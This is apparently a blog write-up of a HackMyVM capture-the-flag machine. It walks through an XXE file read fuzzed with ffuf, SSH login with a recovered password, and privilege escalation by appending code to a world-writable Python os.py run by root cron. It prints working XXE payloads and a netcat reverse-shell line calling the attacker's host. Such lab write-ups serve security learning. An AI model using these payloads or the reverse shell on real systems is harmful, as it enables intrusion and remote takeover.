---
title: System HackMyVm (English)
image: /assets/img/Anexos/Pasted%20image%2020250401124226.png
description: System Machine from HackMyVm [Dificult easy]
categories: [CTF,HackMyVm]
tags: [hacking,easy]
---



## Reconnaissance
We start scanning the net using `nmap`
![](/assets/img/Anexos/Pasted%20image%2020250331144747.png)

Rapidly Nmap reports the victim IP, we confirm that due to the name _system.home_
 
Then, I run `nmap` again in order to know the ports and versions running in that IP:
```shell
❯ nmap -sSCV --min-rate=5000 -Pn -n -p- 192.168.1.44 -oN Nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 14:48 CEST
Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 52.33% done; ETC: 14:49 (0:00:30 remaining)
Warning: 192.168.1.44 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.1.44
Host is up (0.24s latency).
Not shown: 63622 closed tcp ports (reset), 1911 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 27:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba (RSA)
|   256 e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 (ECDSA)
|_  256 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: HackMyVM Panel
|_http-server-header: nginx/1.18.0
MAC Address: F8:B5:4D:EC:75:E3 (Intel Corporate)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.40 seconds
```
Nmap reported the ports _22_ and _80_ so I start with the web:

We get this web:
![](/assets/img/Anexos/Pasted%20image%2020250331145050.png)

Whatever you put in the email box, the respond will be that user is already register:

![](/assets/img/Anexos/Pasted%20image%2020250331145150.png)

Watching the code, I realize it's using **XML** so I use Burp to identify the petition:

![](/assets/img/Anexos/Pasted%20image%2020250331145238.png)

## Explotation

I firstly check if we are struggle with a XXE:

![](/assets/img/Anexos/Pasted%20image%2020250331145513.png)

We have it!, so I try to get a file system, in this case _/etc/passwd_ and I get a user:



![](/assets/img/Anexos/Pasted%20image%2020250331145603.png)

Since david exists as a user, we can check if a id_rsa key exists in the _./ssh_ directory:

![](/assets/img/Anexos/Pasted%20image%2020250331145830.png)

We got it! lets try:

```
❯ ssh -i id_rsa david@192.168.1.44
david@192.168.1.44's password: 
Permission denied, please try again.
david@192.168.1.44's password: 
Permission denied, please try again.
david@192.168.1.44's password: 
david@192.168.1.44: Permission denied (publickey,password).
```

Unfortunately, I couldn't, that's why the _authorized_keys_ file is empty so we can't login until the id_rsa.pub's content is in there. 

![](/assets/img/Anexos/Pasted%20image%2020250331150732.png)

So, as we can list files by using XXE anyway, I try to brute force de home directory to get something else using `ffuf`

```shell
❯ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u http://192.168.1.44/magic.php  -d '<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/david/FUZZ"> ]> <details><email>&xxe;</email><password>das</password></details>' --fw 11

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.1.44/magic.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt
 :: Data             : <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/david/FUZZ"> ]> <details><email>&xxe;</email><password>das</password></details>
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 11
________________________________________________

.profile                [Status: 200, Size: 892, Words: 138, Lines: 28, Duration: 15ms]
.ssh/id_rsa             [Status: 200, Size: 2687, Words: 17, Lines: 39, Duration: 54ms]
.ssh/id_rsa.pub         [Status: 200, Size: 653, Words: 13, Lines: 2, Duration: 44ms]
.viminfo                [Status: 200, Size: 786, Words: 90, Lines: 39, Duration: 100ms]
:: Progress: [2565/2565] :: Job [1/1] :: 595 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

ffuf reports a _.viminfo_ file, this one can be interesting.


![](/assets/img/Anexos/Pasted%20image%2020250331153823.png)

Reading this file we apparently got a password file so lets check that file:

![](/assets/img/Anexos/Pasted%20image%2020250331153854.png)

We got a password, lets try using it in order to login as **david** via ssh

```shell
❯ ssh david@192.168.1.44
david@192.168.1.44's password: #h4ck3rd4v!d
Linux system 5.10.0-13-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Apr  2 12:42:26 2022 from 192.168.1.5
david@system:~$ 


```

Correct, now I'm david

## Privilage Escalation

Listing directories I see **suid.py**
```shell
david@system:/opt$ ls
suid.py
david@system:/opt$ cat suid.py 
from os import system
from pathlib import Path

# Reading only first line
try:
    with open('/home/david/cmd.txt', 'r') as f:
        read_only_first_line = f.readline()
    # Write a new file
    with open('/tmp/suid.txt', 'w') as f:
        f.write(f"{read_only_first_line}")
    check = Path('/tmp/suid.txt')
    if check:
        print("File exists")
        try:
            os.system("chmod u+s /bin/bash")
        except NameError:
            print("Done")
    else:
        print("File not exists")
except FileNotFoundError:
```

Apparently what this program does is give SUID permission if **cmd.txt** exists in the david's home directory and it has content. But it is not as easy as this. We can't run this program because its permissions, we can't try a python library hijacking because of directory permissions either.

```shell
ls -l suid.py 
-rw-r--r-- 1 root root 563 Apr  2  2022 suid.py

```

Let's try **pspy** to see if root or someone else may execute this program:

```shell
--2025-03-31 10:04:07--  https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/120821432/860f70be-0564-48f5-a9da-d1c32505ffb0?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250331%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250331T140407Z&X-Amz-Expires=300&X-Amz-Signature=def16ea30de20b2eb6029a6f361a2f69273034ff354b263b40226e0a466a281b&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream [following]
--2025-03-31 10:04:07--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/120821432/860f70be-0564-48f5-a9da-d1c32505ffb0?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250331%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250331T140407Z&X-Amz-Expires=300&X-Amz-Signature=def16ea30de20b2eb6029a6f361a2f69273034ff354b263b40226e0a466a281b&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                                          0%[                                                                                                                                                  ]    pspy64                                                        100%[=================================================================================================================================================>]   2.96M  --.-KB/s    in 0.06s   

2025-03-31 10:04:08 (45.9 MB/s) - ‘pspy64’ saved [3104768/3104768]
```

Yes, a cron task is executing it:

```shell
2025/03/31 10:12:17 CMD: UID=0     PID=3407   | 
2025/03/31 10:13:01 CMD: UID=0     PID=3409   | /usr/sbin/CRON -f 
2025/03/31 10:13:01 CMD: UID=0     PID=3410   | /usr/sbin/CRON -f 
2025/03/31 10:13:01 CMD: UID=0     PID=3411   | /bin/sh -c /usr/bin/python3.9 /opt/suid.py 

```

Now let's check the sys path:

```shell
david@system:/opt$ python3 -c 'import sys; print(sys.path)'
['', '/usr/lib/python39.zip', '/usr/lib/python3.9', '/usr/lib/python3.9/lib-dynload', '/usr/local/lib/python3.9/dist-packages', '/usr/lib/python3/dist-packages']
```

We can check if **os** or **pathlib** has writable permissions:

```shell
david@system:/opt$ ls /usr/lib/python3.9 -l | grep os
-rw-rw-rw- 1 root root  39063 Apr  2  2022 os.py
-rw-r--r-- 1 root root  21780 Feb 28  2021 _osx_support.py
-rw-r--r-- 1 root root  15627 Feb 28  2021 posixpath.py
```

**os** has writable permissions!. So now I write this in the end of the file:

```python
import subprocess

def esc():
    subprocess.run(["nc","-e""/bin/bash","192.168.1.89","4444"])

esc()
```

While I wait for the cron task to execute, I execute **netcat** on the indicate port and I got the connection from:



![](/assets/img/Anexos/Pasted%20image%2020250401082129.png)